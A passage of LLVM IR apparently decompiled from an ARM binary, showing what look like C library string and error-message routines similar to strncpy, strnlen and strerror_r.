dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ee4cthread-pre-split, %dec_label_pc_ee1c
  %v0_ee58 = phi i32 [ %v0_ee58142, %dec_label_pc_ee4cthread-pre-split ], [ %v4_edf0, %dec_label_pc_ee1c ]
  %v1_ee58 = phi i32 [ %v1_ee5854, %dec_label_pc_ee4cthread-pre-split ], [ %v4_edec, %dec_label_pc_ee1c ]
  %v0_ee44 = phi i32 [ %v0_ee2447, %dec_label_pc_ee4cthread-pre-split ], [ %v1_eda8, %dec_label_pc_ee1c ]
  %v0_ee50 = phi i32 [ %v0_ee4c.pr, %dec_label_pc_ee4cthread-pre-split ], [ %v1_ee1c, %dec_label_pc_ee1c ]
  %v2_ee4c = icmp eq i32 %v0_ee50, 0
  %v1_ee50 = add i32 %v0_ee50, -1
  store i32 %v1_ee50, i32* %r2.global-to-local, align 4
  br i1 %v2_ee4c, label %dec_label_pc_ee58, label %dec_label_pc_ee24

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee4c
  %v2_ee58 = sub nsw i32 %v1_ee58, %v0_ee58
  store i32 %v2_ee58, i32* %r0.global-to-local, align 4
  ret i32 %v2_ee58

; uselistorder directives
  uselistorder i32 %v1_ee50, { 1, 0 }
  uselistorder i32 %v0_ee44, { 1, 0 }
  uselistorder i32 %v3_ee28, { 0, 3, 2, 1 }
  uselistorder i32 %v3_ee24, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ee1c, { 1, 0 }
  uselistorder i32 %v1_edf8, { 1, 0 }
  uselistorder i32 %v4_edf0, { 1, 3, 2, 0 }
  uselistorder i32 %v4_edec, { 1, 2, 3, 0 }
  uselistorder i32 %v2_edd4, { 2, 0, 1 }
  uselistorder i32 %v2_edac, { 2, 0, 1 }
  uselistorder i32 %v1_eda8, { 0, 2, 1 }
  uselistorder i32 %v3_ed78, { 2, 1, 0 }
  uselistorder i32 %v3_ed74, { 1, 2, 0 }
  uselistorder i32 %v0_ed3c, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 6, 8, 10, 9, 5, 7, 11, 0, 1 }
  uselistorder label %dec_label_pc_ee4cthread-pre-split, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_ed68, { 5, 2, 0, 3, 1, 4 }
}

define i32 @function_ee60(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ee60:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_ee60 = icmp eq i32 %arg2, 3
  store i1 %v7_ee60, i1* %cpsr_z.global-to-local, align 1
  %v1_ee68 = add i32 %arg1, -1
  store i32 %v1_ee68, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_eee4, label %dec_label_pc_ee70

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee60
  %v3_ee70 = udiv i32 %arg2, 4
  store i32 %v3_ee70, i32* @lr, align 4
  %v0_ee74.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_ee74

dec_label_pc_ee74:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ee70
  %v2_ee7c = phi i32 [ %v6_eeb4, %dec_label_pc_eec0 ], [ %v1_ee68, %dec_label_pc_ee70 ]
  %v0_ee74 = phi i32 [ %v1_eec4, %dec_label_pc_eec0 ], [ %v0_ee74.pre, %dec_label_pc_ee70 ]
  %v1_ee74 = inttoptr i32 %v0_ee74 to i8*
  %v2_ee74 = load i8, i8* %v1_ee74, align 1
  %v3_ee74 = zext i8 %v2_ee74 to i32
  store i32 %v3_ee74, i32* %r3.global-to-local, align 4
  %v2_ee78 = icmp eq i8 %v2_ee74, 0
  store i1 %v2_ee78, i1* %cpsr_z.global-to-local, align 1
  %v3_ee7c = add i32 %v2_ee7c, 1
  %v4_ee7c = inttoptr i32 %v3_ee7c to i8*
  store i8 %v2_ee74, i8* %v4_ee7c, align 1
  %v5_ee7c = load i32, i32* %ip.global-to-local, align 4
  %v6_ee7c = add i32 %v5_ee7c, 1
  store i32 %v6_ee7c, i32* %ip.global-to-local, align 4
  %v0_ee80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee80, label %dec_label_pc_eed0, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee74
  %v0_ee84 = load i32, i32* @r1, align 4
  %v1_ee84 = add i32 %v0_ee84, 1
  %v2_ee84 = inttoptr i32 %v1_ee84 to i8*
  %v3_ee84 = load i8, i8* %v2_ee84, align 1
  %v4_ee84 = zext i8 %v3_ee84 to i32
  store i32 %v4_ee84, i32* %r3.global-to-local, align 4
  %v2_ee88 = icmp eq i8 %v3_ee84, 0
  store i1 %v2_ee88, i1* %cpsr_z.global-to-local, align 1
  %v3_ee8c = add i32 %v5_ee7c, 2
  %v4_ee8c = inttoptr i32 %v3_ee8c to i8*
  store i8 %v3_ee84, i8* %v4_ee8c, align 1
  %v5_ee8c = load i32, i32* %ip.global-to-local, align 4
  %v6_ee8c = add i32 %v5_ee8c, 1
  store i32 %v6_ee8c, i32* %ip.global-to-local, align 4
  %v0_ee90 = load i32, i32* @r1, align 4
  %v1_ee90 = add i32 %v0_ee90, 1
  store i32 %v1_ee90, i32* %r1.global-to-local, align 4
  %v0_ee94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee94, label %dec_label_pc_eed0, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee84
  %v1_ee98 = add i32 %v0_ee90, 2
  %v2_ee98 = inttoptr i32 %v1_ee98 to i8*
  %v3_ee98 = load i8, i8* %v2_ee98, align 1
  %v4_ee98 = zext i8 %v3_ee98 to i32
  store i32 %v4_ee98, i32* %r3.global-to-local, align 4
  %v2_ee9c = icmp eq i8 %v3_ee98, 0
  store i1 %v2_ee9c, i1* %cpsr_z.global-to-local, align 1
  %v3_eea0 = add i32 %v5_ee8c, 2
  %v4_eea0 = inttoptr i32 %v3_eea0 to i8*
  store i8 %v3_ee98, i8* %v4_eea0, align 1
  %v5_eea0 = load i32, i32* %ip.global-to-local, align 4
  %v6_eea0 = add i32 %v5_eea0, 1
  store i32 %v6_eea0, i32* %ip.global-to-local, align 4
  %v0_eea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eea4 = add i32 %v0_eea4, 1
  store i32 %v1_eea4, i32* %r1.global-to-local, align 4
  %v0_eea8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eea8, label %dec_label_pc_eed0, label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_ee98
  %v1_eeac = add i32 %v0_eea4, 2
  %v2_eeac = inttoptr i32 %v1_eeac to i8*
  %v3_eeac = load i8, i8* %v2_eeac, align 1
  %v4_eeac = zext i8 %v3_eeac to i32
  store i32 %v4_eeac, i32* %r3.global-to-local, align 4
  %v2_eeb0 = icmp eq i8 %v3_eeac, 0
  store i1 %v2_eeb0, i1* %cpsr_z.global-to-local, align 1
  %v3_eeb4 = add i32 %v5_eea0, 2
  %v4_eeb4 = inttoptr i32 %v3_eeb4 to i8*
  store i8 %v3_eeac, i8* %v4_eeb4, align 1
  %v5_eeb4 = load i32, i32* %ip.global-to-local, align 4
  %v6_eeb4 = add i32 %v5_eeb4, 1
  store i32 %v6_eeb4, i32* %ip.global-to-local, align 4
  %v0_eeb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eeb8 = add i32 %v0_eeb8, 1
  store i32 %v1_eeb8, i32* %r1.global-to-local, align 4
  %v0_eebc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eebc, label %dec_label_pc_eed0, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeac
  %v0_eec0 = load i32, i32* @lr, align 4
  %v1_eec0 = add i32 %v0_eec0, -1
  store i32 %v1_eec0, i32* @lr, align 4
  %v7_eec0 = icmp eq i32 %v0_eec0, 1
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  %v1_eec4 = add i32 %v0_eeb8, 2
  store i32 %v1_eec4, i32* @r1, align 4
  br i1 %v7_eec0, label %dec_label_pc_eee4, label %dec_label_pc_ee74

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eeac, %dec_label_pc_ee98, %dec_label_pc_ee84, %dec_label_pc_ee74
  %v1_eed0 = phi i32 [ %v6_eeb4, %dec_label_pc_eeac ], [ %v6_eea0, %dec_label_pc_ee98 ], [ %v6_ee8c, %dec_label_pc_ee84 ], [ %v6_ee7c, %dec_label_pc_ee74 ]
  %v2_eed01 = sub i32 %arg1, %v1_eed0
  %v2_eed4 = add i32 %v2_eed01, %arg2
  store i32 %v2_eed4, i32* %r3.global-to-local, align 4
  %v1_eed8 = add i32 %v2_eed4, -1
  store i32 %v1_eed8, i32* %r2.global-to-local, align 4
  %v7_eed8 = icmp eq i32 %v2_eed4, 1
  store i1 %v7_eed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eed8, label %bb, label %dec_label_pc_ef04

bb:                                               ; preds = %dec_label_pc_eed0
  ret i32 %arg1

dec_label_pc_eee4:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ee60
  %v2_eef46 = phi i32 [ %v1_ee68, %dec_label_pc_ee60 ], [ %v6_eeb4, %dec_label_pc_eec0 ]
  %v1_eee4 = urem i32 %arg2, 4
  store i32 %v1_eee4, i32* %r2.global-to-local, align 4
  %v2_eee4 = icmp eq i32 %v1_eee4, 0
  store i1 %v2_eee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eee4, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_eee4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_eee4, %._crit_edge
  %v2_eef4 = phi i32 [ %v6_eef4, %._crit_edge ], [ %v2_eef46, %dec_label_pc_eee4 ]
  %v0_eef0 = phi i32 [ %v0_eef0.pre, %._crit_edge ], [ %v1_eee4, %dec_label_pc_eee4 ]
  %v0_eeec = load i32, i32* @r1, align 4
  %v1_eeec = inttoptr i32 %v0_eeec to i8*
  %v2_eeec = load i8, i8* %v1_eeec, align 1
  %v3_eeec = zext i8 %v2_eeec to i32
  store i32 %v3_eeec, i32* %r3.global-to-local, align 4
  %v5_eeec = add i32 %v0_eeec, 1
  store i32 %v5_eeec, i32* @r1, align 4
  %v1_eef0 = add i32 %v0_eef0, -1
  store i32 %v1_eef0, i32* %r2.global-to-local, align 4
  %v7_eef0 = icmp eq i32 %v0_eef0, 1
  store i1 %v7_eef0, i1* %cpsr_z.global-to-local, align 1
  %v3_eef4 = add i32 %v2_eef4, 1
  %v4_eef4 = inttoptr i32 %v3_eef4 to i8*
  store i8 %v2_eeec, i8* %v4_eef4, align 1
  %v5_eef4 = load i32, i32* %ip.global-to-local, align 4
  %v6_eef4 = add i32 %v5_eef4, 1
  store i32 %v6_eef4, i32* %ip.global-to-local, align 4
  %v0_eef8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eef8, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_eefc = load i32, i32* %r3.global-to-local, align 4
  %v2_eefc = icmp eq i32 %v0_eefc, 0
  store i1 %v2_eefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eefc, label %dec_label_pc_ef04, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_eef0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_ef04:                                ; preds = %dec_label_pc_eed0, %bb13, %dec_label_pc_ef04
  %v2_ef0c = phi i32 [ %v6_ef0c, %dec_label_pc_ef04 ], [ %v1_eed0, %dec_label_pc_eed0 ], [ %v6_eef4, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ef08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ef08 = add i32 %v0_ef08, -1
  store i32 %v1_ef08, i32* %r2.global-to-local, align 4
  %v7_ef08 = icmp eq i32 %v0_ef08, 1
  store i1 %v7_ef08, i1* %cpsr_z.global-to-local, align 1
  %v3_ef0c = add i32 %v2_ef0c, 1
  %v4_ef0c = inttoptr i32 %v3_ef0c to i8*
  store i8 0, i8* %v4_ef0c, align 1
  %v5_ef0c = load i32, i32* %ip.global-to-local, align 4
  %v6_ef0c = add i32 %v5_ef0c, 1
  store i32 %v6_ef0c, i32* %ip.global-to-local, align 4
  %v0_ef10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ef10, label %dec_label_pc_ef14, label %dec_label_pc_ef04

dec_label_pc_ef14:                                ; preds = %dec_label_pc_ef04
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_ef0c, { 1, 0 }
  uselistorder i32 %v0_ef08, { 1, 0 }
  uselistorder i32 %v6_eef4, { 0, 2, 1 }
  uselistorder i32 %v1_eee4, { 2, 1, 0 }
  uselistorder i32 %v2_eed4, { 2, 1, 0 }
  uselistorder i32 %v1_eec4, { 1, 0 }
  uselistorder i32 %v0_eec0, { 1, 0 }
  uselistorder i32 %v6_eeb4, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 2, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_ef04, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_ef18(i8* %arg1) local_unnamed_addr {
dec_label_pc_ef18:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ef18 = load i32, i32* @r1, align 4
  %v2_ef18 = icmp eq i32 %v0_ef18, 0
  br i1 %v2_ef18, label %bb, label %dec_label_pc_ef48

bb:                                               ; preds = %dec_label_pc_ef18
  ret i32 0

dec_label_pc_ef30:                                ; preds = %dec_label_pc_ef58
  %v3_ef30 = icmp uge i32 %v5_efe4, %v1_ef30
  %v9_ef30 = icmp eq i32 %v5_efe4, %v1_ef30
  %v2_ef34 = xor i1 %v3_ef30, true
  %v3_ef34 = or i1 %v9_ef30, %v2_ef34
  br i1 %v3_ef34, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_ef30
  %v6_ef34 = sub i32 %v5_efe4, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_ef30, %bb19
  %v5_ef38 = phi i32 [ %v1_ef30, %dec_label_pc_ef30 ], [ %v6_ef34, %bb19 ]
  %v2_ef38 = xor i1 %v9_ef30, true
  %v3_ef38 = and i1 %v3_ef30, %v2_ef38
  br i1 %v3_ef38, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_ef38 = sub i32 %v5_ef38, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_ef3c = phi i32 [ %v5_ef38, %bb20 ], [ %v6_ef38, %bb21 ]
  ret i32 %v8_ef3c

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef8c
  br label %dec_label_pc_efe0

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef18
  %v2_ef48 = add i32 %tmp, %v0_ef18
  %v3_ef48 = icmp ult i32 %v2_ef48, %tmp
  br i1 %v3_ef48, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_ef48
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_ef48, %bb23
  %v5_efe4 = phi i32 [ %v2_ef48, %dec_label_pc_ef48 ], [ -1, %bb23 ]
  %v1_ef682 = urem i32 %tmp, 4
  %v2_ef683 = icmp eq i32 %v1_ef682, 0
  br i1 %v2_ef683, label %dec_label_pc_ef70, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %bb24, %dec_label_pc_ef64
  %v1_ef30 = phi i32 [ %v1_ef64, %dec_label_pc_ef64 ], [ %tmp, %bb24 ]
  %v1_ef58 = inttoptr i32 %v1_ef30 to i8*
  %v2_ef58 = load i8, i8* %v1_ef58, align 1
  %v2_ef5c = icmp eq i8 %v2_ef58, 0
  br i1 %v2_ef5c, label %dec_label_pc_ef30, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef58
  %v1_ef64 = add i32 %v1_ef30, 1
  %v1_ef68 = urem i32 %v1_ef64, 4
  %v2_ef68 = icmp eq i32 %v1_ef68, 0
  br i1 %v2_ef68, label %dec_label_pc_ef70, label %dec_label_pc_ef58

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef64, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_ef64, %dec_label_pc_ef64 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_efd032 = icmp ult i32 %storemerge.lcssa, %v5_efe4
  br i1 %v3_efd032, label %dec_label_pc_ef78, label %dec_label_pc_efe0

dec_label_pc_ef78:                                ; preds = %dec_label_pc_efcc, %dec_label_pc_ef70
  %v0_ef4039 = phi i32 [ %v4_ef78, %dec_label_pc_efcc ], [ %storemerge.lcssa, %dec_label_pc_ef70 ]
  %v1_ef78 = inttoptr i32 %v0_ef4039 to i32*
  %v2_ef78 = load i32, i32* %v1_ef78, align 4
  %v4_ef78 = add i32 %v0_ef4039, 4
  store i32 %v4_ef78, i32* @lr, align 4
  %v2_ef7c = add i32 %v2_ef78, -16843009
  %v2_ef80 = and i32 %v2_ef7c, -2139062144
  %v2_ef84 = icmp eq i32 %v2_ef80, 0
  br i1 %v2_ef84, label %dec_label_pc_efcc, label %dec_label_pc_ef8c

dec_label_pc_ef8c:                                ; preds = %dec_label_pc_ef78
  %v2_ef8c = inttoptr i32 %v0_ef4039 to i8*
  %v3_ef8c = load i8, i8* %v2_ef8c, align 1
  %v2_ef94 = icmp eq i8 %v3_ef8c, 0
  %v1_ef98 = add i32 %v0_ef4039, 1
  br i1 %v2_ef94, label %dec_label_pc_ef40, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef8c
  %v2_efa0 = inttoptr i32 %v1_ef98 to i8*
  %v3_efa0 = load i8, i8* %v2_efa0, align 1
  %v2_efa4 = icmp eq i8 %v3_efa0, 0
  br i1 %v2_efa4, label %dec_label_pc_efe0, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_efa0
  %v1_efac = add i32 %v0_ef4039, 2
  %v2_efac = inttoptr i32 %v1_efac to i8*
  %v3_efac = load i8, i8* %v2_efac, align 1
  %v2_efb0 = icmp eq i8 %v3_efac, 0
  br i1 %v2_efb0, label %dec_label_pc_efe0, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_efac
  %v1_efbc = add i32 %v0_ef4039, 3
  %v2_efbc = inttoptr i32 %v1_efbc to i8*
  %v3_efbc = load i8, i8* %v2_efbc, align 1
  %v2_efc0 = icmp eq i8 %v3_efbc, 0
  br i1 %v2_efc0, label %dec_label_pc_efe0, label %dec_label_pc_efcc

dec_label_pc_efcc:                                ; preds = %dec_label_pc_efbc, %dec_label_pc_ef78
  %v3_efd0 = icmp ult i32 %v4_ef78, %v5_efe4
  br i1 %v3_efd0, label %dec_label_pc_ef78, label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %dec_label_pc_efcc, %dec_label_pc_ef70, %dec_label_pc_efa0, %dec_label_pc_efac, %dec_label_pc_efbc, %dec_label_pc_ef40
  %v1_efe0 = phi i32 [ %v0_ef4039, %dec_label_pc_ef40 ], [ %storemerge.lcssa, %dec_label_pc_ef70 ], [ %v1_ef98, %dec_label_pc_efa0 ], [ %v1_efac, %dec_label_pc_efac ], [ %v1_efbc, %dec_label_pc_efbc ], [ %v5_efe4, %dec_label_pc_efcc ]
  %v3_efe0 = icmp uge i32 %v5_efe4, %v1_efe0
  %v9_efe0 = icmp eq i32 %v5_efe4, %v1_efe0
  %v2_efe4 = xor i1 %v3_efe0, true
  %v3_efe4 = or i1 %v9_efe0, %v2_efe4
  br i1 %v3_efe4, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_efe0
  %v6_efe4 = sub i32 %v5_efe4, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_efe0, %bb25
  %v5_efe8 = phi i32 [ %v1_efe0, %dec_label_pc_efe0 ], [ %v6_efe4, %bb25 ]
  %v2_efe8 = xor i1 %v9_efe0, true
  %v3_efe8 = and i1 %v3_efe0, %v2_efe8
  br i1 %v3_efe8, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_efe8 = sub i32 %v5_efe8, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_efec = phi i32 [ %v5_efe8, %bb26 ], [ %v6_efe8, %bb27 ]
  ret i32 %v8_efec

; uselistorder directives
  uselistorder i1 %v3_efe0, { 1, 0 }
  uselistorder i32 %v4_ef78, { 1, 2, 0 }
  uselistorder i32 %v0_ef4039, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_ef64, { 1, 0, 2 }
  uselistorder i32 %v1_ef30, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_efe4, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_ef30, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_efe0, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_ef58, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_eff8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eff8:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f000 = call i32 @function_f00c()
  %v0_f004 = load i32, i32* @r4, align 4
  ret i32 %v0_f004
}

define i32 @function_f00c() local_unnamed_addr {
dec_label_pc_f00c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_f00c = load i32, i32* @r4, align 4
  %v0_f010 = load i32, i32* @r0, align 4
  %v0_f01c = load i32, i32* @r1, align 4
  store i32 %v0_f01c, i32* @r8, align 4
  %v0_f020 = load i32, i32* @r2, align 4
  store i32 %v0_f020, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_f010, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_f058

thread-pre-split.preheader:                       ; preds = %dec_label_pc_f00c
  store i32 ptrtoint ([8 x i8]* @global_var_16a24.398 to i32), i32* @r5, align 4
  %v2_f0403446 = icmp eq i32 %v0_f010, 0
  br i1 %v2_f0403446, label %bb26, label %dec_label_pc_f034.lr.ph

dec_label_pc_f034:                                ; preds = %dec_label_pc_f034.lr.ph, %bb
  %v2_f04c41 = phi i1 [ %v2_f04c3849, %dec_label_pc_f034.lr.ph ], [ %v2_f04c, %bb ]
  %v1_f05040 = phi i32 [ %v0_f040.pr48, %dec_label_pc_f034.lr.ph ], [ %v2_f03c, %bb ]
  %v0_f03839 = phi i32 [ %v0_f044547, %dec_label_pc_f034.lr.ph ], [ %v1_f038, %bb ]
  %v1_f038 = add i32 %v0_f03839, 1
  store i32 %v1_f038, i32* @r5, align 4
  br i1 %v2_f04c41, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_f034
  %v2_f03c = add i32 %v1_f05040, -1
  %v2_f040 = icmp eq i32 %v2_f03c, 0
  %v1_f044 = inttoptr i32 %v1_f038 to i8*
  %v2_f044 = load i8, i8* %v1_f044, align 1
  %v2_f04c = icmp eq i8 %v2_f044, 0
  br i1 %v2_f040, label %dec_label_pc_f04c, label %dec_label_pc_f034

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_f034
  %v1_f04435 = inttoptr i32 %v1_f038 to i8*
  %v2_f04436 = load i8, i8* %v1_f04435, align 1
  %v2_f04c38 = icmp eq i8 %v2_f04436, 0
  br label %dec_label_pc_f034.lr.ph

dec_label_pc_f034.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_f04c3849 = phi i1 [ %v2_f04c38, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_f040.pr48 = phi i32 [ %v1_f05040, %thread-pre-split.loopexit ], [ %v0_f010, %thread-pre-split.preheader ]
  %v0_f044547 = phi i32 [ %v1_f038, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_16a24.398 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_f034

dec_label_pc_f04c:                                ; preds = %bb
  br i1 %v2_f04c, label %dec_label_pc_f058, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_f04c
  %v0_f038.lcssa55 = phi i32 [ %v1_f038, %dec_label_pc_f04c ], [ ptrtoint ([8 x i8]* @global_var_16a24.398 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f058:                                ; preds = %dec_label_pc_f04c, %dec_label_pc_f00c
  %v3_f05c = ashr i32 %v0_f010, 31
  %v5_f070 = bitcast i32* %stack_var_-25 to i8*
  %v6_f070 = call i32 @function_11510(i8* %v5_f070, i32 %v0_f010, i32 %v3_f05c, i32 -10, i32 0)
  %v1_f074 = add i32 %v6_f070, -14
  store i32 %v1_f074, i32* @r5, align 4
  store i32 %v1_f074, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_16a14.400 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_f084 = call i32 @function_ec10()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_f08c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %bb26, %dec_label_pc_f058
  %v0_f08c = phi i32 [ %v0_f038.lcssa55, %bb26 ], [ %v0_f08c.pre, %dec_label_pc_f058 ]
  store i32 %v0_f08c, i32* @r0, align 4
  %v0_f090 = call i32 @function_ecc0()
  %v0_f094 = load i32, i32* @r8, align 4
  %v2_f094 = icmp eq i32 %v0_f094, 0
  %v1_f098 = add i32 %v0_f090, 1
  store i32 %v1_f098, i32* @r4, align 4
  br i1 %v2_f094, label %bb27, label %dec_label_pc_f08c._crit_edge

dec_label_pc_f08c._crit_edge:                     ; preds = %dec_label_pc_f08c
  %v1_f0a0.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_f08c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_f08c._crit_edge, %bb27
  %v4_f0a4 = phi i32 [ %v1_f0a0.pre, %dec_label_pc_f08c._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_f098, %v4_f0a4
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_f0a4, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_f0b414 = phi i32 [ %v4_f0a4, %bb29 ], [ %v1_f098, %bb28 ]
  %v2_f0ac = icmp eq i32 %v0_f0b414, 0
  br i1 %v2_f0ac, label %dec_label_pc_f0d0, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %.thread16
  store i32 %v0_f0b414, i32* @r2, align 4
  %v0_f0b8 = load i32, i32* @r5, align 4
  store i32 %v0_f0b8, i32* @r1, align 4
  store i32 %v0_f094, i32* @r0, align 4
  %v0_f0c0 = call i32 @function_ec10()
  %v0_f0c4 = load i32, i32* @r8, align 4
  %v1_f0c4 = load i32, i32* @r4, align 4
  %v2_f0c4 = add i32 %v1_f0c4, %v0_f0c4
  %v3_f0cc = add i32 %v2_f0c4, -1
  %v4_f0cc = inttoptr i32 %v3_f0cc to i8*
  store i8 0, i8* %v4_f0cc, align 1
  br label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %.thread16, %dec_label_pc_f0b4
  %v0_f0d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_f0d0 = icmp eq i32 %v0_f0d0, 0
  br i1 %v2_f0d0, label %dec_label_pc_f0e0, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0d0
  %v0_f0d8 = call i32 @function_cc08()
  %v0_f0dc = load i32, i32* %r7.global-to-local, align 4
  %v2_f0dc = inttoptr i32 %v0_f0d8 to i32*
  store i32 %v0_f0dc, i32* %v2_f0dc, align 4
  %v0_f0e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f0e0

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0d0, %dec_label_pc_f0d8
  %v0_f0e0 = phi i32 [ 0, %dec_label_pc_f0d0 ], [ %v0_f0e0.pre, %dec_label_pc_f0d8 ]
  store i32 %v3_f00c, i32* @r4, align 4
  ret i32 %v0_f0e0

; uselistorder directives
